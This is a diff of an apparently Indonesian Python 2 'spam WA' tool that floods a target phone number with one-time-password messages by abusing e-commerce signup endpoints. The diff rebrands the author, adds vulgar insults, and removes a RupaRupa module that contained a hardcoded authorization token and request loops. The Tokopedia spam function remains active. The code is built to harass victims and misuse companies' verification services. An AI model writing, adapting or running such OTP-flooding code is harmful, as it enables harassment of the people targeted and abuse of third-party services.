@@ -1,8 +1,8 @@
 #!/usr/bin/python2
 
-# Creator :  AsepAMF-3XP
-# Team : muslim cyber by termux
-# Recode Tidak Akan Membuat Anda Menjadi Pencipta Kode :3
+# Author :  AsepAMF
+# Team : Pasundar Black Cyber
+# Recode Tidak Akan Membuat Anda Menjadi Pencipta Kode kontol :3
 
 from requests import ConnectionError
 from time import sleep
@@ -33,102 +33,20 @@ def MesinTik_2(text):
 	
 def Banner():
 	MesinTik_2(''+C+'''
-
+                    
+   / \   ___  ___ _ __   / \  |  \/  |  ___|
+  / _ \ / __|/ _ \ '_ \ / _ \ | |\/| | |_
+ / ___ \\__ \  __/ |_) / ___ \| |  | |  _|
+/_/   \_\___/\___| .__/_/   \_\_|  |_|_| Maulana Ros Amf
+                 |_|
   ____                         __        __    
  / ___| _ __   __ _ _ __ ___   \ \      / /_ _ 
  \___ \| '_ \ / _` | '_ ` _ \   \ \ /\ / / _` |
   ___) | |_) | (_| | | | | | |   \ V  V / (_| |
- |____/| .__/ \__,_|_| |_| |_|    \_/\_/ \__,_|
+ |____/| .__/ \__,_|_| |_| |_|    \_/\_/ \__,_|kontol
        |_|                                     
-                   '''+W+'Creator : AsepAMF\n\t\t   YT : Maulana Official')
+                   '''+W+'Author : AsepAMF\n\t\t   YT : Mamanak Z Official')
                    
-def RupaRupa():
-	print
-	MesinTik(C+'\t SPAM RUPA RUPA')
-	MesinTik(W+'\t================')
-	print
-	number = raw_input(''+C+'MASUKKAN NOMOR TARGET'+W+' ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
-	jumlah = input(''+C+'JUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
-	print
-	MesinTik_2(''+C+'-------------- '+W+'Starting'+C+' --------------')
-	print
-	hitung = len(number)
-	
-	if hitung < 9:
-		print
-		print(M+'Nomor Tidak Valid !')
-		sys.exit()
-	
-	for x in range(jumlah):
-		try:
-			
-			headers_1 = {
-			
-			'User-Agent' : 'Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10',
-			'Accept' : 'application/json',
-			'Origin' : 'https://m.ruparupa.com',
-			'Referer' : 'https://m.ruparupa.com/my-account',
-			'authorization' : 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.pC9EDy_79GIDd4NOJKZP2kH5EjPdUK5VGUn59CzsdG0',
-			'x-company-name' : 'odi'
-			
-			}
-			
-			data_1 = {
-			
-			'phone' : number,
-			'email' : 'jejak@gmail.com',
-			'action' : 'register',
-			'password' : ''
-			
-			}
-			
-			headers_2 = {
-			
-			'authorization' : 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.pC9EDy_79GIDd4NOJKZP2kH5EjPdUK5VGUn59CzsdG0',
-			'x-company-name' : 'odi', 
-			'User-Agent' : 'Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10',
-			'Origin' : 'https://m.ruparupa.com',
-			'referer' : 'https://m.ruparupa.com/verification?page=otp-choices',
-			'accept-encoding' : 'gzip, deflate, br' 
-			
-			}
-			
-			data_2 = {
-			
-			'phone' : number,
-			'action' : 'register',
-			'channel' : 'chat',
-			'email' : '',
-			'customer_id' : '0',
-			'is_resend' : 0
-			
-			}
-			
-			url_1 = 'https://wapi.ruparupa.com/auth/check-otp-auth'
-			url_2 = 'https://wapi.ruparupa.com/auth/generate-otp'
-			
-			sending_1 = requests.post(url_1, headers = headers_1, data = data_1)
-			sending_2 = requests.post(url_2, headers = headers_2, data = data_2)
-			
-			if 'tunggu 1x24 jam' in sending_2.text:
-				print
-				print(''+W+'Pengiriman Sudah Limit\nSilahkan Coba 1 x 24 Jam Lagi :)')
-				break
-				
-			else:
-				print(''+C+'['+W+'*'+C+']'+W+' SPAM KE NOMOR '+C+number+W+' BERHASIL DIKIRIMKAN !')
-		
-		except ConnectionError:
-			print
-			print(M+'Cek Koneksi JaringanMu Gan !')
-			break
-		
-		except NameError:
-			print
-			print(M+'Jumlah Harus Berupa Angka, Bukan Huruf !')
-			break
-			
-
 def Tokped():
 	print
 	MesinTik(C+'\t SPAM TOKOPEDIA')
@@ -176,7 +94,7 @@ def Tokped():
 				
 			if 'Anda sudah melakukan 3 kali pengiriman kode' in sending.text:
 				print
-				print(''+W+'Pengiriman Sudah Limit\nSilahkan Coba 25 - 60 Menit Lagi :)')
+				print(''+W+'Pengiriman Sudah Limit\nSilahkan Coba 60 Menit Lagi :)')
 				break
 				
 			else:
@@ -184,18 +102,18 @@ def Tokped():
 				
 		except ConnectionError:
 			print
-			print(M+'Cek Koneksi JaringanMu Gan !')
+			print(M+'Cek Koneksi JaringanMu kontol !')
 			break
 		
 		except NameError:
 			print
-			print(M+'Jumlah Harus Berupa Angka, Bukan Huruf !')
+			print(M+'Jumlah Harus Berupa Angka, Bukan Huruf kontol !')
 			break
                    
                    
 def Spam():
 	os.system('clear')
-	print(C+'Subscribe YT'+W+' Gua Dlu Su !'+C+' :V')
+	print(C+'Subscribe YT'+W+' Gua Dlu Su kalo ga gue santet luh !'+C+' :V')
 	sleep(1.5)
 	os.system('xdg-open https://youtu.be/I5lhnxC2aYI')
 	os.system('clear')
@@ -205,7 +123,6 @@ def Spam():
 	print
 	print(C+'MENU'+W+' :')
 	print(C+'\t['+W+'1'+C+']'+W+' SPAM TOKOPEDIA'+C+' ( '+H+'Aktif'+C+' )')
-	print(C+'\t['+W+'2'+C+']'+W+' SPAM RUPA-RUPA'+C+' ( '+M+'NonAktif lagi ada perbaikan bro'+C+' )')
 	print
 	
 	try:
